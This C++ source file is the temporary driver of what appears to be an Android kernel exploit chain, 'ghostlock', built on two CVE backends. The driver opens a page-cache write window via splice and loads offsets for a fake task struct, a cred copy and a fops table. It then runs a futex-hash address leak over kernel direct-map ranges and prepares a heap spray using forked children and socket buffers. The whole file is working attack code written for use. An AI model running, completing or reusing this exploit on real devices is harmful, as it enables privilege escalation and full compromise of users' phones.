/** @file pipeline/run_pipeline_temp.cpp
 *  The temporary entry, step by step. TEMPORARY FILE, removal registered with the checklist.
 */
#include "pipeline/run_pipeline_temp.hpp"

#include <cstdio>
#include <unistd.h>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/seam/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/seam/pagecache_doors.hpp"
#include "backend/cve_2026_43284/seam/pagecache_seam.hpp"
#include "backend/cve_2026_43284/seam/pagecache_write.hpp"
#include "backend/cve_2026_43284/seam/real_splice_io.hpp"
#include "backend/cve_2026_43284/session_frame.hpp"
#include "backend/cve_2026_43499/abi.hpp"
#include "backend/cve_2026_43499/leak/collision_buckets.hpp"
#include "backend/cve_2026_43499/leak/snitch_region.hpp"
/* The device seam's header includes linux/futex.h and this file is compiled for the host as well,
 *  because main.cpp calls it from both. The one step that needs the seam is guarded by platform, not
 *  by a switch: there is no build of this file where a host can map shared memory through it. */
#ifdef __ANDROID__
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
#endif
#include "backend/cve_2026_43499/leak/snitch_policy.hpp"
#include "backend/cve_2026_43499/leak/snitch_setup.hpp"
#include "backend/cve_2026_43499/memory/prepare_page.hpp"
#include "backend/cve_2026_43499/memory/prepare_plan.hpp"
#include "contract/chain_catalog.hpp"
#include "profile/document_pairs.hpp"
#include "contract/op_registry.hpp"
#include "pipeline/component_catalog.hpp"
#include "pipeline/plan_gate.hpp"

namespace ghostlock::pipeline {
    namespace {
#ifdef __ANDROID__
namespace {
    /**
     *  Both device seams in one, copied from the probe that ran this on the hardware. The search
     *  requires a seam that is a heap seam and a snitch seam at once, and the two Linux halves each
     *  answer one of those: this is the composition, not a new mechanism.
     */
    struct DeviceSeam final {
        static backend::cve_2026_43499::leak::MapResult map_shared(std::size_t bytes) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::map_shared(bytes);
        }
        static backend::cve_2026_43499::leak::SeamResult unmap(void *address, std::size_t bytes) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::unmap(address, bytes);
        }
        static backend::cve_2026_43499::leak::SeamResult futex_wait_private(std::uint32_t *word,
                                                                            std::uint32_t expected) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wait_private(word, expected);
        }
        static backend::cve_2026_43499::leak::SeamResult futex_wait_private_until(
            std::uint32_t *word, std::uint32_t expected, std::int64_t timeout_us) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wait_private_until(word, expected,
                                                                                            timeout_us);
        }
        static backend::cve_2026_43499::leak::SeamResult futex_wake_private(std::uint32_t *word,
                                                                           std::int32_t waiters) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wake_private(word, waiters);
        }
        static backend::cve_2026_43499::leak::ThreadResult start_thread(
            backend::cve_2026_43499::leak::ThreadEntry entry, void *argument) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::start_thread(entry, argument);
        }
        static backend::cve_2026_43499::leak::SeamResult join_thread(unsigned long handle) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::join_thread(handle);
        }
        static backend::cve_2026_43499::memory::SeamResult page_size() noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::page_size();
        }
        static backend::cve_2026_43499::memory::SeamResult open_memfd(std::uint64_t pid) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::open_memfd(pid);
        }
        static backend::cve_2026_43499::memory::SeamResult close_fd(std::int32_t fd) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::close_fd(fd);
        }
        static backend::cve_2026_43499::memory::SeamResult socket_pair(std::int32_t *out) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::socket_pair(out);
        }
        static backend::cve_2026_43499::memory::SeamResult set_socket_buffer(std::int32_t fd,
                                                                            std::int32_t bytes) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::set_socket_buffer(fd, bytes);
        }
        static backend::cve_2026_43499::memory::SeamResult set_nonblocking(std::int32_t fd) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::set_nonblocking(fd);
        }
        static backend::cve_2026_43499::memory::SeamResult send_buffer(std::int32_t fd,
                                                                      std::size_t bytes) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::send_buffer(fd, bytes);
        }
        static backend::cve_2026_43499::memory::SeamResult fork_child() noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::fork_child();
        }
        static backend::cve_2026_43499::memory::SeamResult stop_child(std::uint64_t pid) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::stop_child(pid);
        }
        static backend::cve_2026_43499::memory::SeamResult yield_now() noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::yield_now();
        }
        static backend::cve_2026_43499::memory::SeamResult pin_to_processor(std::int32_t cpu) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::pin_to_processor(cpu);
        }
        static void exit_child() noexcept { backend::cve_2026_43499::memory::LinuxHeapSeam::exit_child(); }
    };
}  // namespace
#endif


        using backend::cve_2026_43284::seam::PageCacheWindow;
        using backend::cve_2026_43284::SaMaterial;
        using backend::cve_2026_43284::seam::PageCacheDoorLinux;
        using backend::cve_2026_43284::seam::PageCacheDoors;
        using backend::cve_2026_43284::seam::PageCacheSeam;
        using backend::cve_2026_43284::seam::PageCacheWrite;
        using backend::cve_2026_43284::seam::real_splice_io;
        using backend::cve_2026_43284::seam::RealSpliceIo;
        using backend::cve_2026_43284::read_session_secret_frame;
        using backend::cve_2026_43284::SessionFrameStatus;
    }  // namespace

    int run_pagecache_path_temp(const std::uint8_t *document_bytes,
                                std::size_t document_length) noexcept {
        std::printf("run-temp: document %zu bytes\n", document_length);
        (void)document_bytes;

        /* 1. The frame. It follows the document on the same stream and carries the key material; no
         *    frame means this is not this backend's run and the path stops here. */
        SaMaterial sa{};
        const SessionFrameStatus frame = read_session_secret_frame(0, &sa);
        if (frame == SessionFrameStatus::Missing) {
            std::printf("run-temp: no session frame, so this is not a 43284 run\n");
            return 3;
        }
        if (frame != SessionFrameStatus::Ok) {
            std::printf("run-temp: the frame was refused as %u\n", static_cast<unsigned>(frame));
            return 4;
        }
        /* Declaring the material usable is the caller's act, as the frame's own file says. */
        sa.set = true;

        /* 2. The plan the gate admits. One op, the page cache window, on a route the catalogue lists
         *    for this backend, with its hash declared the way the gate recomputes it. */
        const contract::OpSpec *spec = nullptr;
        for (std::size_t i = 0U; i < contract::kOpCount; ++i) {
            if (std::string_view(contract::kOpCatalog[i].token) == std::string_view("window.pagecache")) {
                spec = &contract::kOpCatalog[i];
                break;
            }
        }
        if (spec == nullptr) {
            std::printf("run-temp: this build has no page cache op\n");
            return 5;
        }
        const PlanOp op{"window.pagecache", contract::op_token_hash("window.pagecache"),
                        contract::route_bit("tcp_zerocopy"), nullptr, 0U, false, -1};
        /* The flags say what this run actually has. The plan comes from the script and not from a
         *  builtin, so script_present is true and builtin_plan_present is false. The queue key is
         *  gone from the surface and must never be present. Geometry and capabilities are here: the
         *  profile this run matched carries them, which is what makes the attack possible at all, and
         *  claiming otherwise made the gate refuse this entry by name on the first device run. */
        const PlanInput input{"cve_2026_43284", &op, 1U, true, false, false, true, true, true};
        const GateVerdict verdict = plan_gate(input);
        if (!verdict.ok) {
            std::printf("run-temp: the gate refused: %s at %s\n", gate_reason_name(verdict.reason),
                        verdict.path);
            return 6;
        }
        std::printf("run-temp: the gate admitted window.pagecache\n");

        /* 3. The doors, the window and the seam, in the order their own comments prescribe. The
         *    carrier is where the page comes from. In the finished path it is chosen by the
         *    selection and carried as a resource; the retired tree read it from resources.carrier.path
         *    and nothing in this tree produces it yet, so this temporary entry takes a development
         *    path and says so. That is what --allow-dev-target exists to widen, and the path is
         *    registered for removal with this file in the checklist. */
        constexpr const char *kDevCarrier = "/data/local/tmp/ghostlock-carrier";
        constexpr std::size_t kDevCarrierBytes = 36U;
        PageCacheDoorLinux door(kDevCarrier, kDevCarrierBytes);
        if (!door.usable()) {
            std::printf("run-temp: the door refused its carrier path\n");
            return 7;
        }
        const int target_fd = door.open_target();
        if (target_fd < 0) {
            std::printf("run-temp: the target could not be opened\n");
            return 7;
        }
        RealSpliceIo io(real_splice_io(), target_fd);
        PageCacheWrite window(door, io);
        PageCacheSeam seam(window);

        /* 4. Up. Without the credentials the doors do not open, and this backend has no route axis,
         *    so the call that matters is the one that takes the whole frame. */
        if (!seam.bring_up_with(sa)) {
            std::printf("run-temp: the seam did not come up\n");
            static_cast<void>(::close(target_fd));
            return 8;
        }
        std::printf("run-temp: seam up, target fd open, window bound\n");
        const bool down = seam.tear_down();
        static_cast<void>(::close(target_fd));
        std::printf("run-temp: torn down %s\n", down ? "ok" : "refused");

        /* 5. The layout inputs, read from the document by section, the way the offsets test does it:
         *    the numbers are data and this is where they arrive. A section that does not bridge is a
         *    named refusal, never a default that a later step would walk over. */
        profile::Document parsed;
        if (parsed.parse(document_bytes, document_length) != profile::DocumentVerdict::Ok) {
            std::printf("run-temp: the document did not parse for its payload section\n");
            return 9;
        }
        /* TEMPORARY, registered in the checklist with this file: the five offsets as declared
         *  development constants. The document this run was given has no abi.payload section, and the
         *  finished path reads them from the profile the kernel was matched against. This is not a
         *  fallback -- a fallback is exactly what the target profile file forbids, because a value
         *  invented when a key is missing is a value nobody chose -- it is a declared source, printed
         *  so a reader of the output knows these numbers did not come from a document. */
        constexpr std::uint64_t kDevLockOffset = 0x58U;
        constexpr std::uint64_t kDevWaiterW0Offset = 0xB0U;
        constexpr std::uint64_t kDevFakeTaskOffset = 0x700U;
        constexpr std::uint64_t kDevCredCopyOffset = 0x900U;
        constexpr std::uint64_t kDevFopsTableOffset = 0x1000U;
        memory::KeyValue dev_pairs[backend::cve_2026_43499::kPayloadFieldCount] = {};
        const std::uint64_t dev_values[backend::cve_2026_43499::kPayloadFieldCount] = {
            kDevLockOffset, kDevWaiterW0Offset, kDevFakeTaskOffset, kDevCredCopyOffset,
            kDevFopsTableOffset};
        for (std::size_t i = 0U; i < backend::cve_2026_43499::kPayloadFieldCount; ++i) {
            dev_pairs[i] = memory::KeyValue{std::string_view(backend::cve_2026_43499::kPayloadFields[i]),
                                            dev_values[i]};
        }
        std::printf("run-temp: payload offsets from the declared temporary source, not a document\n");
        memory::KeyValue payload_pairs[backend::cve_2026_43499::kPayloadFieldCount] = {};
        const auto bridged = profile::read_section_pairs(
            parsed, std::string_view("backend.cve_2026_43499.abi.payload"),
            backend::cve_2026_43499::kPayloadFields,
            backend::cve_2026_43499::kPayloadFieldCount, payload_pairs,
            backend::cve_2026_43499::kPayloadFieldCount);
        memory::KeyView payload_view{payload_pairs, bridged.filled};
        if (bridged.verdict != profile::PairsVerdict::Ok) {
            std::printf("run-temp: the document has no payload section (%s), using the declared source\n",
                        profile::pairs_verdict_name(bridged.verdict));
            payload_view.items = dev_pairs;
            payload_view.count = backend::cve_2026_43499::kPayloadFieldCount;
        }
        backend::cve_2026_43499::PayloadOffsets offsets{};
        const backend::cve_2026_43499::OffsetLookup filled =
            backend::cve_2026_43499::fill_payload_offsets(payload_view, offsets);
        if (filled.verdict != backend::cve_2026_43499::AbiVerdict::Ok) {
            std::printf("run-temp: the payload offsets are incomplete at %s\n",
                        filled.field != nullptr ? filled.field : "an unnamed field");
            return 9;
        }
        std::printf("run-temp: payload offsets read, lock=0x%lx waiter=0x%lx task=0x%lx\n",
                    static_cast<unsigned long>(offsets.lock_offset),
                    static_cast<unsigned long>(offsets.waiter_w0_offset),
                    static_cast<unsigned long>(offsets.fake_task_offset));

        /* 6. The corpus, copied from the device probe that built it and ran on this hardware. Every
         *    number below is either from there or is one of the declared temporary values the
         *    checklist registers; the reasons in the probe comments travel with them. */
        /* Two of the inputs are measured here rather than declared, because they are properties of
         *  the machine this runs on and asking the kernel is the only honest source. */
        const std::uint64_t page_bytes = static_cast<std::uint64_t>(::sysconf(_SC_PAGESIZE));
        const std::uint64_t cpus = static_cast<std::uint64_t>(::sysconf(_SC_NPROCESSORS_ONLN));
        std::printf("run-temp: device reports page=%lu cpus=%lu\n",
                    static_cast<unsigned long>(page_bytes), static_cast<unsigned long>(cpus));

        backend::cve_2026_43499::leak::SnitchInputs snitch_inputs{};
        snitch_inputs.page_size = page_bytes;
        snitch_inputs.mm_struct_size = 0x1000U;
        snitch_inputs.mm_slab_order = 0U;
        snitch_inputs.collisions = 2U;
        snitch_inputs.thread_count = 1U;
        snitch_inputs.possible_cpus = cpus;

        backend::cve_2026_43499::leak::SnitchSetup setup{};
        const backend::cve_2026_43499::leak::SnitchSetupVerdict built =
            backend::cve_2026_43499::leak::build_snitch_setup(snitch_inputs, setup);
        std::printf("run-temp: snitch setup %s\n",
                    backend::cve_2026_43499::leak::snitch_setup_verdict_name(built));
        if (built != backend::cve_2026_43499::leak::SnitchSetupVerdict::Ok) {
            return 10;
        }

        backend::cve_2026_43499::leak::RegionInputs region{};
        region.header_bytes = 256U;
        region.collisions = 2U;
        region.thread_count = 2U;
        region.total_pokes = 1024U;
        region.page_size = 4096U;
        region.word_bytes = 8U;
        region.handle_bytes = 8U;
        backend::cve_2026_43499::leak::RegionLayout region_layout{};
        const backend::cve_2026_43499::leak::RegionVerdict laid =
            backend::cve_2026_43499::leak::layout_snitch_region(region, region_layout);
        std::printf("run-temp: region %s, total %zu bytes\n",
                    backend::cve_2026_43499::leak::region_verdict_name(laid), region_layout.total_bytes);
        if (laid != backend::cve_2026_43499::leak::RegionVerdict::Ok) {
            return 10;
        }

        /* 7. The rest of the walk's geometry, copied from the probe. The slice is inside the direct map
         *    rather than a range from zero, because the walk only hashes the addresses it is given and
         *    never touches memory; the probe's comment records why that matters -- a stub that answered
         *    everything answered with zero. */
        backend::cve_2026_43499::leak::CollisionBuckets buckets{};
        if (backend::cve_2026_43499::leak::futex_hash_context_init(&buckets.context, 64U) != 0) {
            std::printf("run-temp: the hash context refused its table size\n");
            return 10;
        }
        buckets.mm = 0U;

#ifdef __ANDROID__
        const backend::cve_2026_43499::leak::MapResult words_region =
            backend::cve_2026_43499::leak::LinuxSnitchSeam::map_shared(4096U);
        if (words_region.address == nullptr) {
            std::printf("run-temp: the cohort words could not be mapped (errno %d)\n",
                        words_region.error);
            return 10;
        }
        auto *words_base = static_cast<unsigned char *>(words_region.address);
        std::uint32_t *word_ptrs[2] = {reinterpret_cast<std::uint32_t *>(words_base),
                                       reinterpret_cast<std::uint32_t *>(words_base + 64U)};
#else
        /* The host has no seam to map the cohort words through, so that step is named and refused
         *  rather than approximated. Everything before it is the same code on both platforms. */
        std::printf("run-temp: the cohort words need a device; stopping before the search\n");
        return 10;
#endif

        backend::cve_2026_43499::leak::ScanStrides strides{};
        strides.coarse = 4096U;
        strides.slab = 1024U;
        strides.candidate = 256U;
        backend::cve_2026_43499::leak::ScanRange scan_range{};
        scan_range.start = 0xffff800000100000ULL;
        scan_range.end = scan_range.start + 0x10000ULL;

        /* The proof addresses are observed rather than chosen: the second one is found by asking the
         *  real rule which address in the slice shares the first one's bucket. Two arbitrary addresses
         *  would be asking the rule about something nobody observed. */
        std::uint64_t address_table[2] = {scan_range.start, 0U};
        const std::uint64_t wanted_bucket = buckets.bucket_of(address_table[0]);
        for (std::uint64_t at = scan_range.start + 4096U;
             address_table[1] == 0U && at < scan_range.start + 0x100000ULL; at += 4096U) {
            if (buckets.bucket_of(at) == wanted_bucket) {
                address_table[1] = at;
            }
        }
        std::printf("run-temp: proofs bucket=%lu second=0x%lx (observed, not chosen)\n",
                    static_cast<unsigned long>(wanted_bucket),
                    static_cast<unsigned long>(address_table[1]));
        if (address_table[1] == 0U) {
            std::printf("run-temp: no second address was observed in the slice\n");
            return 10;
        }

        /* 8. The preparation, whose inputs are copied from the probe that ran on this hardware. The
         *    geometry is derived from the measured page size, the group counts are its numbers, and
         *    the patience is one attempt with four polls. The template arguments are given rather
         *    than deduced, because the seam and the bucket rule are choices and not defaults. */
#ifdef __ANDROID__
        backend::cve_2026_43499::memory::PageGeometry geometry{};
        geometry.align_region_size = page_bytes * 8U;
        geometry.send_size = static_cast<std::size_t>(geometry.align_region_size) * 2U;
        geometry.socket_buffer = 1 << 20;

        backend::cve_2026_43499::memory::PrepareInputs prepare_inputs{};
        prepare_inputs.pre_groups = 1U;
        prepare_inputs.spray_groups = 2U;
        prepare_inputs.post_groups = 1U;
        prepare_inputs.leak_groups = 1U;
        prepare_inputs.snitch_collisions = 2U;
        prepare_inputs.region_size = geometry.align_region_size;
        /* One object in the region is a page, which is what the probe set and what makes the slab
         *  stride the quotient of the two sizes. Leaving it at zero made the two not divide, and the
         *  device said so by name: geometry-missing, at step one. */
        prepare_inputs.object_size = page_bytes;

        backend::cve_2026_43499::memory::PreparePatience waiting{};
        waiting.max_attempts = 1U;
        waiting.poll_rounds = 4U;

        /* The policy's arguments, eleven of them, each named by the interface that reads it. */
        backend::cve_2026_43499::leak::SnitchPolicyArgs args{};
        args.setup = setup;
        args.region = region;
        args.patience.wake_rounds = 64U;
        args.patience.round_timeout_us = 2000;
        args.counter_offset = 0U;
        args.words = word_ptrs;
        args.word_count = 2U;
        args.strides = strides;
        args.range = scan_range;
        args.sweep_tags = false;
        args.addresses = address_table;
        args.address_count = 2U;

        backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam,
                                                      backend::cve_2026_43499::leak::CollisionBuckets>
            snitch{args, &buckets, {}, false};

        const backend::cve_2026_43499::memory::PrepareOutcome prepared =
            /* The first template argument is the heap half of the platform, not the snitch half: the*/
                /* preparation forks and shapes, and page_size lives on that side. The compiler said so*/
                /* when the snitch seam was passed here -- it lacks page_size, which HeapSeam needs. */
                backend::cve_2026_43499::memory::prepare_page<
                DeviceSeam,
                backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam,
                                                            backend::cve_2026_43499::leak::CollisionBuckets>>(prepare_inputs, geometry, waiting,
                                                                     snitch);
        std::printf("run-temp: prepare %s at=%d opened=%zu closed=%zu base=0x%lx errno=%d\n",
                    backend::cve_2026_43499::memory::prepare_status_name(prepared.status),
                    static_cast<int>(prepared.at_step), prepared.opened, prepared.closed,
                    static_cast<unsigned long>(prepared.base), static_cast<int>(prepared.error));
        if (prepared.status != backend::cve_2026_43499::memory::PrepareStatus::Ok) {
            std::printf("run-temp: stopping after the preparation; the search has not run\n");
            return 12;
        }
#else
        /* The preparation forks and shapes, so it needs the device seam; the host has none. */
        std::printf("run-temp: the preparation needs a device; stopping before it\n");
        return 12;
#endif
        return 0;
    }
}  // namespace ghostlock::pipeline